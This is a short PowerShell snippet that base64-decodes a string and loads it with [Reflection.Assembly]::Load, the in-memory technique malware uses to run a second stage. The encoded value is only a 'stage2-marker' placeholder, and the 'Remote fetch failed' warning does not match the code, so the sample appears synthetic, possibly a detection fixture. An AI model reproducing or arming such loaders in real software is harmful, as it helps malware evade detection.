
try { $PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjowM2R3MmMzaHE0"); $StageResult = [Reflection.Assembly]::Load($PayloadBytes); $StageResult.GetTypes().Count; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Remote fetch failed" }
